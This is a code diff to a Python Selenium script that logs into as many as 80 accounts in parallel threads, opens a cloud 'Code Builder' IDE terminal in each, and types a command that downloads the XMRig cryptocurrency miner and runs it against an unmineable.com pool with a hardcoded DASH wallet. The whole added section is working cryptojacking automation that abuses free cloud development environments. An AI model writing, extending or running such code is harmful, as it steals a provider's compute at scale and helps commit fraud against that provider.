@@ -90,4 +90,59 @@ def open_browser(instance_number, email, password):
         
     original_window = driver.current_window_handle
 
-    WebDriverWait(driver, 30).until(EC.number_of_windows
+    WebDriverWait(driver, 30).until(EC.number_of_windows_to_be(2))
+
+    for handle in driver.window_handles:
+        if handle != original_window:
+            driver.switch_to.window(handle)
+            break
+            
+    print(f"[{email}] Switched to Code Builder window")
+    time.sleep(60)
+    
+    if "redirect_uri" in driver.current_url:
+        parsed_url = urlparse(driver.current_url)
+        query_params = parse_qs(parsed_url.query)
+        redirect_uri = query_params.get('redirect_uri', [''])[0]
+        gg8 = unquote(redirect_uri)
+        driver.get(gg8)
+        time.sleep(50)
+        print(f"[{email}] url {driver.current_url}")
+        actions = ActionChains(driver)
+        actions.key_down(Keys.CONTROL).send_keys('`').key_up(Keys.CONTROL).perform()
+    else:
+        time.sleep(60)
+        print(driver.current_url)
+        actions = ActionChains(driver)
+        actions.key_down(Keys.CONTROL).send_keys('`').key_up(Keys.CONTROL).perform()
+    
+    try:
+        textarea = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-screen")))
+        textarea.click()
+        print("✅ Command executed.")
+    except:
+        print(f"[{email}] ❌ area not found ")
+        
+    try:
+        textarea1 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-helper-textarea")))
+        textarea1.send_keys(Keys.CONTROL + 'c')
+        print(f"{email} SUCCESS CTRL + C")
+        time.sleep(3)
+        textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o rx.unmineable.com:443 -u DASH:XbXf6LCAyeZUoeKWoGwH6A9yauLEi4fSqy.1 --tls -k --threads=4")
+        textarea1.send_keys(Keys.ENTER)
+        print(f"{email} SUCCESS EXECUTE COMMAND")
+    except:
+        print(f"[{email}] ❌ terminal not found ")
+
+# Thread management (unchanged)
+threads = []
+for i, (email, password) in enumerate(accounts[:80]):
+    thread = threading.Thread(target=open_browser, args=(i, email, password))
+    thread.start()
+    threads.append(thread)
+    time.sleep(35)
+
+for thread in threads:
+    thread.join()
+
+print("✅ All Chrome instances launched and optimized.")
